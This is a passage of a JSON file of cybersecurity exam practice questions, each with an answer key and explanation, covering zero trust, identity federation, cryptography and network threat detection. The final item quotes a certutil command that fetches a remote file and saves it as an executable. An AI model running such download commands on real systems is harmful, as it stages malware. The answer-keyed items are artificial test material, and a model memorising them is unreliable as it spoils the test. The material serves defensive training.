suspends standard data retention, rotation, and automated purging policies for all relevant evidence. Failing to preserve relevant logs upon receipt of notice constitutes spoliation of evidence and leads to severe legal penalties. Option C is tempting because archiving preserves data, but standard compression or tiering cycles may discard unindexed fields or fail to halt automated purge jobs. Options A and D permanently erase evidence relevant to the litigation.","l":"c2-logging","l2":"","k":""},{"id":"lq:c2-netarch:1","set":"lq","ch":2,"d":1,"q":"An enterprise is replacing its legacy SSL-VPN with a Zero Trust Network Architecture (ZTNA) solution for remote workers. What is the PRIMARY security advantage of ZTNA over the legacy VPN?","o":["ZTNA replaces application-layer encryption with hardware-bound IPsec tunnels at the network perimeter","ZTNA grants restricted application-level Layer 7 access via encrypted micro-tunnels rather than broad Layer 3 network access","ZTNA eliminates the need for user authentication by continuously validating endpoint hardware serial numbers","ZTNA enforces deep packet inspection by terminating all encrypted sessions at the local perimeter firewall"],"a":1,"e":"Traditional VPNs grant remote users broad Layer 3 access to entire internal IP subnets, allowing an adversary who compromises a remote laptop to scan and pivot laterally across internal hosts. ZTNA enforces least privilege by granting access strictly to specific authorized Layer 7 applications via temporary encrypted micro-tunnels, preventing lateral discovery. The other options misstate how ZTNA manages encryption and identity.","l":"c2-netarch","l2":"","k":""},{"id":"lq:c2-netarch:2","set":"lq","ch":2,"d":1,"q":"A multinational corporation has thousands of remote workers accessing cloud-hosted SaaS applications (Microsoft 365, Salesforce). Network monitoring indicates severe latency because all remote worker traffic is being backhauled across VPN tunnels to the corporate datacenter firewall before exiting to the Internet. Which architectural framework directly eliminates this traffic hairpinning?","o":["Software-Defined Storage (SDS)","Virtual Desktop Infrastructure (VDI)","Air-gapped segmentation","Secure Access Service Edge (SASE)"],"a":3,"e":"Secure Access Service Edge (SASE) eliminates traffic hairpinning (backhauling) by delivering security inspection services (SWG, CASB, FWaaS, ZTNA) at globally distributed cloud Points of Presence (PoPs) located geographically close to the user, allowing direct and secure access to cloud SaaS applications.","l":"c2-netarch","l2":"","k":""},{"id":"lq:c2-netarch:3","set":"lq","ch":2,"d":1,"q":"A financial institution requires a dedicated, private, and highly reliable connection between its primary on-premises datacenter and its AWS cloud environment to support high-frequency trading applications. The connection must completely bypass the public Internet and deliver predictable latency. Which solution BEST meets these requirements?","o":["AWS Direct Connect","Site-to-Site IPsec VPN Gateway","Software-Defined WAN (SD-WAN) over broadband","Client-to-site OpenVPN tunnel"],"a":0,"e":"AWS Direct Connect (or Azure ExpressRoute) establishes a dedicated physical leased-line network connection directly from an on-premises datacenter to the cloud provider, bypassing the public Internet entirely to provide deterministic throughput, ultra-low latency, and enhanced privacy.","l":"c2-netarch","l2":"","k":""},{"id":"lq:c2-netarch:4","set":"lq","ch":2,"d":1,"q":"During a ransomware outbreak, a security analyst identifies an infected engineering workstation actively attempting to encrypt shared network drives. Which action should the analyst take FIRST to contain the threat while preserving forensic evidence?","o":["Reboot the workstation into Safe Mode to execute an offline antimalware remediation scan","Immediately disconnect the workstation's physical power cable to halt encryption in memory","Isolate the workstation from the network using the endpoint detection and response (EDR) agent","Apply an updated Group Policy Object across the domain to disable PowerShell execution"],"a":2,"e":"Isolating the endpoint via the EDR agent instantly cuts off network connectivity to prevent ransomware propagation and C2 callbacks while preserving volatile RAM and maintaining the management tunnel for forensic triage. Powering off the machine destroys volatile memory (including encryption keys and process state), and GPO updates take too long to propagate during an active outbreak.","l":"c2-netarch","l2":"","k":""},{"id":"lq:c2-netarch:5","set":"lq","ch":2,"d":1,"q":"An organization is vetting a critical third-party SaaS payroll provider. The security manager requests audit documentation demonstrating that the provider's security controls have been operating effectively over the past twelve months. Which report provides the HIGHEST level of assurance?","o":["SOC 2 Type I Report","SOC 2 Type II Report","Standardized Information Gathering (SIG) Self-Assessment","SSAE-16 Non-Disclosure Agreement"],"a":1,"e":"A SOC 2 Type II report evaluates and verifies the operational effectiveness of a service organization's security controls over an extended testing period (typically 6 to 12 months). In contrast, a SOC 2 Type I report only assesses the design of controls at a single specific point in time.","l":"c2-netarch","l2":"","k":""},{"id":"lq:c2-netarch:6","set":"lq","ch":2,"d":1,"q":"In a Software-Defined Networking (SDN) deployment, an enterprise security team wants to programmatically inspect and update routing policies across all network switches from a central controller. Which SDN plane and interface are utilized to communicate routing instructions from the controller to the physical switches?","o":["Management plane using Northbound REST APIs","Data plane using SNMP v3 queries","Application plane using BGP peering","Control plane using Southbound APIs such as OpenFlow"],"a":3,"e":"In SDN architecture, the Control Plane contains the centralized network intelligence and makes forwarding decisions. It communicates instructions and flow tables down to the physical switching hardware in the Data Plane via Southbound APIs, of which OpenFlow is the industry standard.","l":"c2-netarch","l2":"","k":""},{"id":"lq:c2-netarch:7","set":"lq","ch":2,"d":1,"q":"During an annual third-party risk review, a critical cloud analytics vendor that stores sensitive customer PII refuses to allow the client organization to conduct an annual security audit, despite a clear right-to-audit clause in the master service agreement. How should the security analyst handle this refusal?","o":["Accept an updated self-attested SIG questionnaire from the vendor in place of an independent assessment","Waive the audit requirement provided the vendor supplies a marketing whitepaper outlining security architecture","Document the refusal as a critical security risk finding and escalate it to legal counsel and organizational leadership","Conduct unannounced external vulnerability scans against the vendor's public infrastructure to verify controls"],"a":2,"e":"When a vendor refuses to honor a contractually binding right-to-audit clause, the refusal represents a critical governance breakdown and risk finding. The analyst must escalate the matter to leadership and legal counsel to pursue contractual remedies or evaluate vendor termination. Accepting self-assessments or marketing claims fails to satisfy audit requirements, and unauthorized scanning is unethical and potentially illegal.","l":"c2-netarch","l2":"","k":""},{"id":"lq:c2-netarch:8","set":"lq","ch":2,"d":1,"q":"As an organization completes its migration to cloud services and remote work, the Chief Information Security Officer (CISO) notes that traditional castle-and-moat perimeter firewalls can no longer adequately protect corporate data. Which two architectural controls serve as the primary trust anchors in this deperimeterized environment?","o":["Identity and Access Management (IAM) and network microsegmentation","Stateful boundary firewalls and centralized intrusion prevention systems","Demilitarized zone (DMZ) bastions and multi-protocol label switching (MPLS) circuits","Network address translation (NAT) pools and dynamic host configuration protocol (DHCP) snooping"],"a":0,"e":"In a deperimeterized Zero Trust architecture, Identity and Access Management (IAM) becomes the primary control boundary (authenticating users and devices dynamically), while network microsegmentation restricts lateral movement between workloads. Traditional edge firewalls, DMZ bastions, and NAT gateways are perimeter-centric controls that become ineffective once users, data, and workloads move off the physical corporate network.","l":"c2-netarch","l2":"","k":""},{"id":"lq:c2-iam:1","set":"lq","ch":2,"d":1,"q":"An enterprise is rolling out a Bring Your Own Device (BYOD) policy allowing employees to access corporate email and proprietary documents on personal smartphones. Employee council representatives express concern that corporate IT might monitor personal photos or remotely erase personal data. Which technology BEST addresses these concerns while protecting corporate assets?","o":["Full Mobile Device Management (MDM) enrollment with supervisor mode","Client-side certificate pinning enforced through an on-premises VPN gateway","Mobile Application Management (MAM) with application sandboxing and DLP policies","Zero Trust Network Access (ZTNA) with continuous biometric posture checking"],"a":2,"e":"Mobile Application Management (MAM) isolates, sandboxes, and protects corporate applications and sensitive organizational data without managing the underlying mobile operating system. Administrators can remotely wipe only corporate application storage (a selective wipe) without viewing personal photos, web history, or executing a destructive full device wipe. Option A is the classic BYOD trap: full MDM enrollment gives IT root/supervisor control over the entire device, including full-wipe capabilities and device-wide tracking, which directly triggers employee privacy concerns. Options B and D enforce network transport and posture controls but do not provide application-level data containerization.","l":"c2-iam","l2":"","k":""},{"id":"lq:c2-iam:2","set":"lq","ch":2,"d":1,"q":"A financial services firm is implementing passwordless authentication to protect against advanced adversary-in-the-middle (AiTM) phishing proxies (such as Evilginx). Which authentication mechanism provides cryptographic phishing resistance by binding credentials directly to the website's domain origin?","o":["FIDO2 / WebAuthn hardware security keys","SMS-delivered one-time verification codes","Push notifications with number-matching verification","Time-based One-Time Password (TOTP) authenticator application tokens"],"a":0,"e":"FIDO2 / WebAuthn utilizes public-key cryptography where the private key remains hardware-isolated on a security key or TPM chip. Crucially, the cryptographic authentication assertion is cryptographically bound to the browser's fully qualified domain origin. If an attacker directs a victim to a reverse-proxy phishing domain (e.g., login.micros0ft.com), the browser passes the attacker's domain to the token, which refuses to sign the authentication request for the legitimate domain. Option C is tempting because number matching prevents MFA fatigue push attacks, but an active reverse-proxy will simply forward the prompt number to the victim and steal the resulting session token upon completion. Options B and D can be harvested in real time by AiTM proxies.","l":"c2-iam","l2":"","k":""},{"id":"lq:c2-iam:3","set":"lq","ch":2,"d":1,"q":"A security engineer is integrating a new cloud-native mobile application with the corporate identity provider. The engineer needs the user to authenticate and needs the mobile app to receive an ID token confirming the user's verified identity. Which protocol is SPECIFICALLY engineered for this purpose?","o":["Kerberos v5","OAuth 2.0 authorization framework","LDAP directory binding","OpenID Connect (OIDC)"],"a":3,"e":"OpenID Connect (OIDC) is an authentication layer built directly on top of OAuth 2.0 that issues JSON Web Tokens (ID tokens) to verify user identity. In contrast, OAuth 2.0 alone is strictly an authorization framework that issues access tokens for API delegation.","l":"c2-iam","l2":"","k":""},{"id":"lq:c2-iam:4","set":"lq","ch":2,"d":1,"q":"An organization seeks to reduce the attack surface of its Domain Admins and cloud root accounts by eliminating permanent administrative access. The security team wants privileges granted only when required for a specific maintenance ticket and automatically revoked after two hours. Which PAM capability should be implemented?","o":["Privileged credential vaulting with automated daily password rotation","Just-in-Time (JIT) access with ephemeral privilege elevation","Privileged session monitoring with keystroke logging and screen recording","Role-Based Access Control (RBAC) with static security group nesting"],"a":1,"e":"Just-in-Time (JIT) access (also called ephemeral privilege elevation) provisions elevated rights dynamically only when an approved change ticket exists, revoking privileges automatically when the maintenance window expires. This completely eliminates 'standing privileges' that attackers can exploit via credential dumping. Option A is tempting because password vaulting secures credentials, but if an administrator holds permanent administrative role membership, compromise of that identity grants immediate access without time restrictions. Option C records administrative sessions for compliance but does not eliminate standing access. Option D relies on static group assignments, which maintain permanent administrative attack surface.","l":"c2-iam","l2":"","k":""},{"id":"lq:c2-iam:5","set":"lq","ch":2,"d":1,"q":"A defense contractor must configure an operating system environment where access to classified project files is strictly governed by mandatory security clearance labels (e.g., Confidential, Secret, Top Secret). Resource owners must NOT have the authority to share files or modify access permissions at their own discretion. Which access control model MUST be deployed?","o":["Discretionary Access Control (DAC)","Role-Based Access Control (RBAC)","Mandatory Access Control (MAC)","Attribute-Based Access Control (ABAC)"],"a":2,"e":"Mandatory Access Control (MAC), implemented in systems like SELinux, enforces access decisions strictly through the operating system based on fixed security clearance labels assigned to subjects and classification labels assigned to objects. Users cannot modify or grant permissions at their own discretion.","l":"c2-iam","l2":"","k":""},{"id":"lq:c2-iam:6","set":"lq","ch":2,"d":1,"q":"A SOC analyst reviews identity telemetry in Microsoft Entra ID and flags an alert: a marketing user successfully logged into corporate email from Atlanta, Georgia, at 08:15 AM, and then successfully authenticated from a data center IP address in Tokyo, Japan, at 08:45 AM. Which identity threat indicator does this scenario represent?","o":["Credential vault exhaustion","Impossible travel","MFA push exhaustion","Kerberoasting privilege escalation"],"a":1,"e":"This scenario demonstrates an impossible travel anomaly. The temporal difference (30 minutes) between Atlanta and Tokyo makes physical human transit impossible, indicating that valid user credentials or session tokens have been compromised and abused from a remote location.","l":"c2-iam","l2":"","k":""},{"id":"lq:c2-iam:7","set":"lq","ch":2,"d":1,"q":"An organization is evaluating several biometric facial-recognition systems for physical datacenter access control. The security architect is comparing performance datasheets to determine which system offers the highest overall authentication accuracy. Which metric should the architect compare?","o":["Crossover Error Rate (CER)","False Acceptance Rate (FAR)","False Rejection Rate (FRR)","Failure to Enroll (FTE) rate"],"a":0,"e":"The Crossover Error Rate (CER), also known as the Equal Error Rate (EER), is the operating point where the False Acceptance Rate (Type II error) equals the False Rejection Rate (Type I error). Because FAR and FRR can be artificially manipulated by adjusting biometric sensitivity thresholds (making the system either overly permissive or excessively strict), CER represents the definitive metric for comparing overall system accuracy: a lower CER denotes a more accurate and balanced biometric system. Option B is tempting because organizations want low unauthorized entry rates, but setting FAR extremely low forces FRR higher, frustrating legitimate users. Option D measures user enrollment difficulty rather than recognition accuracy.","l":"c2-iam","l2":"","k":""},{"id":"lq:c2-iam:8","set":"lq","ch":2,"d":1,"q":"During a quarterly security audit, an analyst discovers twelve active Active Directory user accounts belonging to employees who were terminated several months prior. What term describes these accounts, and what lifecycle process failed?","o":["Service Principal Accounts resulting from incomplete authorization","Privileged Vault Accounts resulting from lack of JIT access","Stale federation claims resulting from misconfigured SAML tokens","Orphaned accounts resulting from incomplete deprovisioning"],"a":3,"e":"Orphaned accounts are valid directory accounts that remain enabled and active after an employee leaves an organization due to a failure in the offboarding and deprovisioning lifecycle workflow. Attackers actively seek out orphaned accounts because their activities rarely trigger scrutiny from managers or account owners. Option A is tempting because service accounts are often overlooked, but accounts tied to departed human employees are orphaned accounts. Option B describes PAM credential vaults, and Option C refers to federated identity tokens.","l":"c2-iam","l2":"","k":""},{"id":"lq:c2-federation:1","set":"lq","ch":2,"d":1,"q":"A security engineer is conducting a code audit on an internal application repository before deploying to production. The engineer notices that a developer accidentally committed an unencrypted database connection string containing plaintext administrative credentials three weeks ago. The developer subsequently pushed a new commit removing the line of code. Which action MUST the security engineer take?","o":["Confirm the repository is safe since the credentials are no longer present in the HEAD commit","Configure an XML Signature Wrapping filter on the local workstation","Immediately revoke and rotate the database credentials and purge the commit history using tools like TruffleHog","Convert the database credentials into an OAuth 2.0 authorization code grant"],"a":2,"e":"Simply deleting a secret in a subsequent commit does not eliminate the risk, because Git preserves complete version history across all prior commits. Anyone with repository access can inspect previous commits to recover the plaintext password. The engineer must immediately revoke and rotate the database password in the secrets vault and clean the Git history.","l":"c2-federation","l2":"","k":""},{"id":"lq:c2-federation:2","set":"lq","ch":2,"d":1,"q":"An organization wants to enforce the principle of least privilege across its system engineering team. Rather than providing engineers with permanent local administrator and Domain Admin rights, the organization implements a PAM solution where elevated rights are granted only upon approval of an active change ticket and automatically expire after two hours. Which PAM concept is being utilized?","o":["Just-in-Time (JIT) access","Home Realm Discovery (HRD)","Discretionary Access Control (DAC)","Standing privilege delegation"],"a":0,"e":"Just-in-Time (JIT) access grants elevated administrative privileges dynamically on demand for a strictly limited duration upon ticket verification, completely eliminating persistent 'standing privileges' that adversaries can exploit.","l":"c2-federation","l2":"","k":""},{"id":"lq:c2-federation:3","set":"lq","ch":2,"d":1,"q":"An enterprise web application integrates with a cloud-hosted marketing platform using OAuth 2.0. The marketing platform needs to query customer contact information hosted on the enterprise's customer database API. According to OAuth 2.0 architecture, which role does the customer database API represent?","o":["Authorization Server","Client Application","Resource Owner","Resource Server"],"a":3,"e":"In OAuth 2.0, the Resource Server is the server hosting the protected data or business resources (in this case, the customer database API) that accepts and validates scoped access tokens issued by the Authorization Server.","l":"c2-federation","l2":"","k":""},{"id":"lq:c2-federation:4","set":"lq","ch":2,"d":1,"q":"A security architect is configuring automated secret rotation across all cloud microservices. What is the PRIMARY security benefit of configuring short rotation intervals (such as rotating database credentials every 30 days) in AWS Secrets Manager or Azure Key Vault?","o":["It eliminates the requirement for transport layer encryption between microservice APIs and database backends","It shrinks the temporal window of opportunity during which a compromised or leaked credential can be successfully exploited","It automatically converts SAML XML authentication assertions into ephemeral JSON Web Tokens","It enforces role-based access control by validating client IP addresses on every database connection"],"a":1,"e":"Automated credential rotation regularly changes secrets without human intervention. If a database password or API token is inadvertently logged, leaked, or stolen, its operational utility to an attacker is strictly limited to the remaining days before the rotation window expires. Rotation does not replace transport encryption, alter identity assertion formats, or enforce RBAC.","l":"c2-federation","l2":"","k":""},{"id":"lq:c2-federation:5","set":"lq","ch":2,"d":1,"q":"During an incident investigation following an intrusion into an on-premises federation server, an analyst determines that the threat actor extracted the private token-signing X.509 certificate used by Active Directory Federation Services (AD FS). What attack is the threat actor now capable of executing?","o":["XML injection against the local Domain Name System (DNS) resolver","Bypassing physical smartcard PINs using offline dictionary attacks","Forging arbitrary SAML tokens offline to impersonate any corporate user across federated cloud services (Golden SAML)","Executing brute-force password guessing against Kerberos service accounts"],"a":2,"e":"Compromising the private token-signing certificate of an Identity Provider enables a Golden SAML attack. The adversary can forge valid SAML assertions offline for any identity (including global administrators), bypassing MFA and gaining persistent access to all federated cloud applications without interacting with the IdP.","l":"c2-federation","l2":"","k":""},{"id":"lq:c2-federation:6","set":"lq","ch":2,"d":1,"q":"A SOC analyst observes anomalous Kerberos TGS ticket requests targeting multiple internal Active Directory service accounts associated with Service Principal Names (SPNs), followed by heavy CPU utilization on an untrusted endpoint. Which attack technique is occurring?","o":["Kerberoasting","Home Realm Discovery poisoning","OpenID Connect redirect hijacking","XML Signature Wrapping"],"a":0,"e":"Kerberoasting (MITRE ATT&CK T1558.003) occurs when an attacker requests Kerberos Ticket Granting Service (TGS) tickets for service accounts with SPNs and extracts the ticket hashes to crack their passwords offline using high-performance CPU/GPU cracking tools.","l":"c2-federation","l2":"","k":""},{"id":"lq:c2-federation:7","set":"lq","ch":2,"d":1,"q":"An administrator is configuring a partner federation trust in Active Directory Federation Services. When an external partner employee attempts to authenticate, the federation system must determine which specific partner federation server handles their identity. What AD FS mechanism performs this lookup?","o":["SAML Assertion Consumer Service","Home Realm Discovery (HRD)","OAuth Scoped Delegation","Privileged Credential Vaulting"],"a":1,"e":"Home Realm Discovery (HRD) is the automated AD FS process that identifies which specific Identity Provider or federation server is responsible for authenticating a user, typically by evaluating the domain suffix of the user's UPN or email address.","l":"c2-federation","l2":"","k":""},{"id":"lq:c2-federation:8","set":"lq","ch":2,"d":1,"q":"A cloud security team wants to completely eliminate static long-lived AWS API keys stored on virtual machine filesystems. Which mechanism should the team deploy to allow EC2 instances to securely access Amazon S3 buckets?","o":["Configure AWS Secrets Manager to inject permanent IAM user access keys into environment variables at boot","Generate long-lived IAM access keys restricted to specific CIDR blocks within an S3 bucket policy","Store encrypted credentials in an S3 bucket accessible only via pre-signed HTTP URLs","Attach IAM instance roles to the EC2 instances to provision dynamic ephemeral STS tokens"],"a":3,"e":"Attaching an IAM instance role allows EC2 instances to request temporary security credentials (STS tokens) dynamically via the Instance Metadata Service (IMDSv2). These credentials expire automatically and rotate without administrative overhead, eliminating static secrets on disk. Injecting permanent keys into environment variables, files, or bucket policies still relies on long-lived secrets that can be extracted if the instance is compromised.","l":"c2-federation","l2":"","k":""},{"id":"lq:c2-crypto:1","set":"lq","ch":2,"d":1,"q":"A security analyst reviews outbound firewall logs and observes an HTTP POST request containing the string <code>dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9U2VjcmV0MTIzIQ==</code>. Which of the following statements BEST describes this finding?","o":["The credentials are encoded with Base64, providing no confidentiality and allowing immediate decoding by anyone.","The credentials are encrypted with an asymmetric public key algorithm requiring a private key to view.","The credentials are encrypted with a symmetric block cipher to prevent unauthorized inspection.","The credentials represent a salted SHA-256 cryptographic hash digest verifying sender integrity."],"a":0,"e":"Base64 is an encoding scheme, not an encryption method. It uses an open public algorithm without any cryptographic key, meaning anyone who captures the string can decode it instantly into plaintext. It provides zero confidentiality.","l":"c2-crypto","l2":"","k":""},{"id":"lq:c2-crypto:2","set":"lq","ch":2,"d":1,"q":"A company requires end-to-end email encryption for all 5,000 corporate staff. The solution must integrate with the enterprise Active Directory Certificate Services (AD CS) hierarchy to ensure central issuance, policy enforcement, and revocation. Which protocol should the security architect select?","o":["S/MIME","PGP","TLS","GPG"],"a":0,"e":"S/MIME is built on centralized hierarchical PKI utilizing X.509 digital certificates issued by enterprise or commercial Certificate Authorities. PGP and GPG rely on a decentralized web of trust, which is unsuitable for centralized enterprise management. TLS secures email in transit between mail servers, not end-to-end within user mailboxes.","l":"c2-crypto","l2":"","k":""},{"id":"lq:c2-crypto:3","set":"lq","ch":2,"d":1,"q":"During a vulnerability scan of a legacy payment processing server, an analyst identifies the presence of the 3DES (Triple DES) cipher suite in TLS configurations. Why should the analyst log this finding as a high-priority vulnerability?","o":["3DES relies on an unpadded ECB stream mode that leaks plaintext frequency patterns across network segments.","3DES is a deprecated legacy block cipher with a 64-bit block size vulnerable to collision attacks such as Sweet32.","3DES is an asymmetric cipher that lacks perfect forward secrecy and exposes long-term private root keys.","3DES enforces 512-bit Diffie-Hellman parameters that are susceptible to precomputation downgrade attacks."],"a":1,"e":"3DES is an obsolete symmetric block cipher with a small 64-bit block size. When transmitting large amounts of data over a single TLS session (such as bulk HTTPS transfers), birthday bound collisions occur rapidly, exposing the cipher to Sweet32 attacks (CVE-2016-2183) that allow attackers to recover plaintext session cookies. NIST has formally retired 3DES, mandating AES with a 128-bit block size or ChaCha20. Option A is tempting because ECB mode is insecure, but 3DES in TLS typically uses CBC mode; the fatal weakness is the 64-bit block size. Options C and D describe asymmetric key exchange weaknesses rather than symmetric cipher vulnerabilities.","l":"c2-crypto","l2":"","k":""},{"id":"lq:c2-crypto:4","set":"lq","ch":2,"d":1,"q":"An organization experiences the theft of a company laptop from an employee's vehicle. The laptop's SSD was protected using BitLocker full-disk encryption bound to the system's TPM chip, and the device was powered off at the time of theft. Which data state was protected, and what is the MOST likely risk level to the stored files?","o":["Data in use; the files are at high risk because TPM keys are unencrypted in volatile memory.","Data in transit; the files are at moderate risk until the network connection times out.","Data at rest; the files are at low risk because the disk cannot be decrypted without authentication.","Data in execution; the files are at critical risk because BitLocker only protects individual user profiles."],"a":2,"e":"BitLocker full-disk encryption (FDE) protects data at rest. When the machine is powered off, the disk sectors remain encrypted with AES and bound to the TPM. Without the startup PIN/passphrase or recovery key, unauthorized access to stored data is virtually impossible, resulting in low risk.","l":"c2-crypto","l2":"","k":""},{"id":"lq:c2-crypto:5","set":"lq","ch":2,"d":1,"q":"A SOC analyst notices that web clients connecting to an internal HTTPS portal experience handshake delays and timeout errors whenever the internal Certificate Authority goes offline. Which enhancement should the security team implement to eliminate this dependency during TLS negotiation?","o":["Configure DNS Certification Authority Authorization (CAA) records to restrict certificate issuance.","Implement OCSP stapling on the web server to cache and deliver the signed revocation status.","Deploy a daily Certificate Revocation List (CRL) distribution point on the external firewall.","Transition web server certificates from Elliptic Curve Cryptography (ECC) to 4096-bit RSA keys."],"a":1,"e":"OCSP stapling (officially known as the TLS Certificate Status Request extension) shifts the burden of certificate revocation verification from the client to the web server. The web server periodically queries the CA's OCSP responder, caches the signed timestamped response, and 'staples' it directly into the initial TLS handshake with the connecting client. This eliminates client lookup latency and prevents connection failures if the CA is temporarily unreachable. Option C is tempting because CRLs handle revocation, but CRLs require clients to download large, static revocation files, creating significant bandwidth overhead and delay. Option A specifies authorized issuers in DNS, and Option D alters cryptographic keys without resolving revocation lookup dependencies.","l":"c2-crypto","l2":"","k":""},{"id":"lq:c2-crypto:6","set":"lq","ch":2,"d":1,"q":"A financial institution discovers that proprietary market forecasting algorithms were leaked to an external forum. The source code and document files contained no Social Security numbers, credit card numbers, or standard PII patterns. Which DLP detection mechanism would have been MOST effective at preventing this exfiltration?","o":["Regular expression (regex) pattern matching","Database credit card Luhn algorithm validation","Document fingerprinting (exact data matching)","Dictionary-based sensitive keyword filtering"],"a":2,"e":"Document fingerprinting (or Exact Data Matching) computes cryptographic hashes or shingle hashes across sensitive internal source code, proprietary algorithms, and corporate forms. When an endpoint or network DLP sensor inspects outbound traffic, it compares byte sequences and hashes against the fingerprint database, identifying intellectual property leaks even when the content contains no recognizable patterns (such as SSNs or credit cards) or when partial text excerpts are transmitted. Option D is tempting because keywords can flag sensitive topics, but attackers easily bypass keyword lists through synonym substitution, comments, or minor variable renames. Options A and B rely on rigid numerical formats (like Luhn-compliant PANs or SSN regular expressions) that do not exist in proprietary algorithms.","l":"c2-crypto","l2":"","k":""},{"id":"lq:c2-crypto:7","set":"lq","ch":2,"d":1,"q":"A human resources vice president requests that employee salary records be classified as Restricted and mandates that only HR personnel have read access. The security operations team implements AES-256 encryption on the storage volume and configures role-based access control lists accordingly. In this scenario, what role does the HR vice president represent?","o":["Data Custodian","Registration Authority","Privacy Officer","Data Owner"],"a":3,"e":"The Data Owner is the business leader or department head who determines data classification, dictates retention and handling requirements, and authorizes access. The security operations team acting to configure encryption and access control lists acts as the Data Custodian.","l":"c2-crypto","l2":"","k":""},{"id":"lq:c2-crypto:8","set":"lq","ch":2,"d":1,"q":"A merchant system processes online customer credit card transactions. According to PCI DSS standards, which of the following data elements is strictly prohibited from being retained on merchant systems following authorization, even if encrypted?","o":["Primary Account Number (PAN)","Cardholder Name","Card Expiration Date","Card Verification Value (CVV/CVC)"],"a":3,"e":"PCI DSS strictly prohibits storing Sensitive Authentication Data (SAD), including the CVV/CVC card verification codes, full magnetic stripe track data, and PIN verification blocks, after transaction authorization under any circumstances, even with encryption.","l":"c2-crypto","l2":"","k":""},{"id":"lq:c3-network:1","set":"lq","ch":3,"d":1,"q":"A SOC analyst reviews firewall traffic and identifies an internal workstation communicating with an external IP address on TCP port 443 every 60 seconds (+/- 12 seconds) continuously for 48 hours. What attack technique does this behavior MOST likely represent, and what mechanism is being used to evade basic frequency detection?","o":["Command and control beaconing with algorithmic timing jitter","Data exfiltration via DNS tunneling with recursive query caching","Active Directory enumeration using BloodHound LDAP queries","Volumetric denial of service using SYN flood reflection"],"a":0,"e":"Beaconing is periodic outbound communication from a compromised host to attacker C2 infrastructure. The variation (+/- 12 seconds around the 60-second baseline) represents timing jitter, an intentional technique used by malware authors to avoid rigid interval rules that trigger simple frequency-based SIEM alarms.","l":"c3-network","l2":"","k":""},{"id":"lq:c3-network:2","set":"lq","ch":3,"d":1,"q":"During an investigation of an unavailable e-commerce portal, an analyst observes moderate inbound network bandwidth, 100% database CPU utilization, and hundreds of incoming requests targeting a complex inventory reporting endpoint returning HTTP 503 and 429 status codes. Which type of attack is occurring?","o":["Volumetric UDP amplification flood","BGP routing hijack","DNS amplification reflection","Application resource exhaustion attack"],"a":3,"e":"Resource exhaustion attacks generate moderate or low traffic volume that targets computationally expensive backend queries (such as complex database reports), starving CPU, memory, or thread pools. In contrast, volumetric floods saturate network interfaces with massive traffic spikes.","l":"c3-network","l2":"","k":""},{"id":"lq:c3-network:3","set":"lq","ch":3,"d":1,"q":"A network security administrator detects a rogue Wi-Fi access point broadcasting the same SSID as the corporate guest network with identical encryption settings, but operating at a higher signal strength from an unmanaged wireless transmitter in the parking lot. What specific attack is taking place?","o":["Rogue wired hardware implant","Evil twin attack","ARP table poisoning","DNS hijacking"],"a":1,"e":"An evil twin is a rogue wireless access point that mimics a legitimate SSID with stronger transmission power to trick users into associating with it, allowing the attacker to conduct eavesdropping and credential harvesting. A standard rogue AP is physically plugged into the corporate wired LAN.","l":"c3-network","l2":"","k":""},{"id":"lq:c3-network:4","set":"lq","ch":3,"d":1,"q":"An analyst reviews internal DNS resolver logs and discovers a single host generating over 5,000 queries per hour for subdomains ending in <code>.corp-updates.info</code>. Each subdomain consists of 65 random alphanumeric characters. Which technique is being executed?","o":["Port scanning sweep","ARP cache poisoning","DNS tunneling exfiltration","SNMP MIB walking"],"a":2,"e":"DNS tunneling encodes commands or exfiltrated data into the subdomain labels of DNS query strings. The telltale indicators are long query lengths (>50 characters), high Shannon entropy (random-looking character strings), and high query frequency directed to a specific domain.","l":"c3-network","l2":"","k":""},{"id":"lq:c3-network:5","set":"lq","ch":3,"d":1,"q":"A newly installed behavioral anomaly detection engine triggers hundreds of high-severity alerts per hour for normal nightly database backup routines across enterprise database clusters. What is the BEST course of action for the security team?","o":["Disable the anomaly detection engine across the database tier to eliminate notification noise","Quarantine the database servers onto an isolated VLAN during the scheduled backup window","Tune anomaly thresholds and establish suppression rules for known-good backup operations","Modify the SIEM retention policy to purge database event records older than twelve hours"],"a":2,"e":"When behavioral anomaly engines flag legitimate business processes, analysts must tune thresholds, refine baseline models, and create documented suppression filters for verified maintenance operations. Disabling security monitoring blinds the team to actual intrusions, and network isolation or purging audit logs disrupts operations and destroys forensic trails.","l":"c3-network","l2":"","k":""},{"id":"lq:c3-network:6","set":"lq","ch":3,"d":1,"q":"A corporate switch logs multiple dynamic ARP inspection (DAI) violations on port Gi0/12. Telemetry indicates that the host on that port is responding to ARP requests intended for the default gateway IP address using its own physical MAC address. What attack is the host attempting?","o":["Man-in-the-Middle (MitM) via ARP poisoning","Active Directory privilege escalation via BloodHound","Application resource exhaustion flood","Egress firewall evasion via TCP port 4444"],"a":0,"e":"ARP poisoning (or ARP spoofing) involves sending forged ARP responses mapping a legitimate network IP address (such as the default gateway) to an attacker's MAC address. This causes subnet traffic intended for the gateway to route through the attacker's machine, enabling a Man-in-the-Middle attack.","l":"c3-network","l2":"","k":""},{"id":"lq:c3-network:7","set":"lq","ch":3,"d":1,"q":"An incident responder investigates a suspected data exfiltration incident. Sysmon logs reveal that <code>powershell.exe</code> executed a script that created a password-protected <code>.zip</code> file in <code>C:\\Windows\\Temp\\</code> and subsequently uploaded it to a public cloud storage URL. According to the S-C-U-D framework, which two phases of exfiltration occurred?","o":["Scanning and Exploitation","Staging and Cloud storage abuse","Enumeration and Persistence","Beaconing and Lateral movement"],"a":1,"e":"Creating a compressed, password-protected archive in a temporary directory represents the Staging phase of exfiltration. Uploading that staged archive to a public cloud storage platform using a scripting interpreter represents Cloud storage abuse under the S-C-U-D framework.","l":"c3-network","l2":"","k":""},{"id":"lq:c3-network:8","set":"lq","ch":3,"d":1,"q":"A security engineer configures an enterprise SIEM to alert on internal network reconnaissance. Which of the following tools specifically generates heavy LDAP query volume against domain controllers to discover Active Directory privilege escalation paths and group relationships?","o":["Wireshark","NetFlow","sFlow","BloodHound"],"a":3,"e":"BloodHound (utilizing the SharpHound ingestor) queries Active Directory domain controllers via LDAP to enumerate domain users, groups, computer objects, and access control lists (ACLs) to map shortest privilege escalation paths to Domain Admin.","l":"c3-network","l2":"","k":""},{"id":"lq:c3-host:1","set":"lq","ch":3,"d":1,"q":"A SOC analyst reviews process creation logs and observes the following command executed on an executive workstation:<br/><code>certutil.exe -urlcache -split -f https://storage.remote-repo.org/update.bin C:\\Windows\\Temp\\update.exe</code><br/>Which of the 